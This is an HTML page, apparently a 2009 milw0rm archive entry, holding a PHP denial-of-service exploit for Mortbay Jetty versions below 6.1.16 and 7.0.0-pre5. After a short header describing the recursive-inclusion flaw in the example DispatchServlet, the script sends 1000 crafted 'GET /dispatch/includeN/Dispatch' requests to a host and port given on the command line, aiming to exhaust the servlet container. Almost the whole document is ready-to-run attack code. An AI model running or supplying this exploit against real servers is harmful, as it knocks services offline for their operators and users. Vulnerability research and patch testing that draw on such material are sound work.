<html><head><title>Mortbay Jetty <= 7.0.0-pre5 Dispatcher Servlet Denial of Service Exploit</title></head><pre>&lt;?php
####################################################################################
# Mortbay Jetty &lt;= 7.0.0-pre5 Dispatcher Servlet DoS							  	
#																					
# Affected Software: Jetty &lt; 6.1.16, &lt; 7.0.0.pre5 (all platforms)					
# Author: Ikki (http://blog.nibblesec.org/)											
#																					
# Description: 																		
# The dispatcher servlet (com.acme.DispatchServlet) is prone to a DoS vulnerability.
# This example servlet is meant to be used as a resources dispatcher, however a 	
# malicious aggressor may abuse this functionality in order to cause a recursive 	
# inclusion. In detail, it is possible to abuse the method  						
# com.acme.DispatchServlet.doGet(DispatchServlet.java:203) forcing the application 	
# to recursively include the &quot;DispatchServlet&quot;. 									
# As a result, it is possible to trigger a &quot;java.lang.StackOverflowError&quot; and 		
# consequently an internal server error (500). Multiple requests may easily affect 	
# the availability of the entire servlet container. 								
####################################################################################

error_reporting(E_ALL&amp;E_NOTICE);
echo(&quot;\n\n :: Jetty Dispatcher Servlet DoS - http://blog.nibblesec.org  ::\n&quot;);
echo(&quot; :: Affected Software: Jetty &lt; 6.1.16, &lt; 7.0.0.pre5 - all platforms :: \n\n&quot;);

if($argc==3){
	$cont=0;
	$reqNum=1000;
	$req = &quot;GET /dispatch/includeN/Dispatch HTTP/1.0\r\n&quot;;
	$req .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$req .= &quot;\r\n&quot;;
	while($cont&lt;$reqNum){
		$sock = fsockopen($argv[1],$argv[2],$errno,$errstr,30);
		if(!$sock){
			echo &quot;\nNo response from &quot;.$argv[1];
			die;
		}
		fwrite($sock,$req);
		fclose($sock);
		echo(&quot;.&quot;);
		$cont++;
	}
	echo (&quot;\n\nCheck your servlet container, after &quot; . $reqNum . &quot; requests:\n&quot; . &quot;http://&quot; . $argv[1] . &quot;:&quot; . $argv[2] . &quot;/&quot;);
}else{
	echo(&quot;\nphp &quot; . $argv[0] . &quot; &lt;host&gt; &lt;port&gt;\n\n&quot;);
}

# milw0rm.com [2009-05-08]</pre></html>